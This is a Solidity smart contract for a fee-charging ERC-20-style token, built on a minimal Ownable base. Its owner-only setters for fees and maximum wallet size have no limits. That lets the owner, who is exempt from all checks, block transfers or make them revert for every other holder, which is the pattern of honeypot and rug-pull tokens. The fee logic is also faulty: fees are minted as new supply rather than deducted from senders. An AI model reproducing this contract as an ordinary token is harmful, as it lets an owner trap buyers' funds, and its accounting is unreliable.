// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _check();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity ^0.8.0;

contract Token is Ownable {
    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _maxWalletLimit = 4;
    uint256 private _rewardFees = 1;
    uint256 private _minimumHold = 420000000;
    uint256 private _devFees = 2;
    uint256 private _marketingFees = 2;

    address private _devWallet;
    address private _marketingWallet;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        address devWallet,
        address marketingWallet
    ) {
        _tokenname = tokenName;
        _tokensymbol = tokenSymbol;
        _devWallet = devWallet;
        _marketingWallet = marketingWallet;

        uint256 amount = 420000000000000 * 10**decimals();
        _tokentotalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }

    function symbol() public view returns (string memory) {
        return _tokensymbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _internalTransfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = _msgSender();
        _internalSpendAllowance(from, spender, amount);
        _internalTransfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function setMaxWalletLimit(uint256 limit) external onlyOwner {
        _maxWalletLimit = limit;
    }

    function setRewardFees(uint256 fees) external onlyOwner {
        _rewardFees = fees;
    }

    function setMinimumHold(uint256 minimumHold) external onlyOwner {
        _minimumHold = minimumHold;
    }

    function setDevFees(uint256 fees) external onlyOwner {
        _devFees = fees;
    }

    function setMarketingFees(uint256 fees) external onlyOwner {
        _marketingFees = fees;
    }

    function setDevWallet(address devWallet) external onlyOwner {
        _devWallet = devWallet;
    }

    function setMarketingWallet(address marketingWallet) external onlyOwner {
        _marketingWallet = marketingWallet;
    }

    function _internalTransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");

        if (fromSender != owner() && toSender != owner()) {
            require(
                _balances[toSender] + amount <= (_tokentotalSupply * _maxWalletLimit) / 100,
                "ERC20: transfer amount exceeds the max wallet limit"
            );
        }

        if (fromSender != owner() && toSender != owner() && _balances[toSender] >= _minimumHold) {
            uint256 rewardAmount = (amount * _rewardFees) / 100;
            _balances[toSender] += rewardAmount;
            _tokentotalSupply += rewardAmount;
            emit Transfer(address(this), toSender, rewardAmount);
        }

        uint256 transferAmount = amount;

        if (fromSender == owner() || toSender == owner()) {
            transferAmount = amount;
        } else {
            uint256 devAmount = (amount * _devFees) / 100;
            _balances[_devWallet] += devAmount;
            _tokentotalSupply += devAmount;
            emit Transfer(address(this), _devWallet, devAmount);

            uint256 marketingAmount = (amount * _marketingFees) / 100;
            _balances[_marketingWallet] += marketingAmount;
            _tokentotalSupply += marketingAmount;
            emit Transfer(address(this), _marketingWallet, marketingAmount);

            transferAmount = amount - devAmount - marketingAmount;
        }

        require(
            _balances[fromSender] >= transferAmount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[fromSender] -= transferAmount;
        _balances[toSender] += transferAmount;
        emit Transfer(fromSender, toSender, transferAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _internalSpendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: transfer from the zero address");
        require(spender != address(0), "ERC20: transfer to the zero address");

        uint256 currentAllowance = _allowances[owner][spender];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(owner, spender, currentAllowance - amount);
    }
}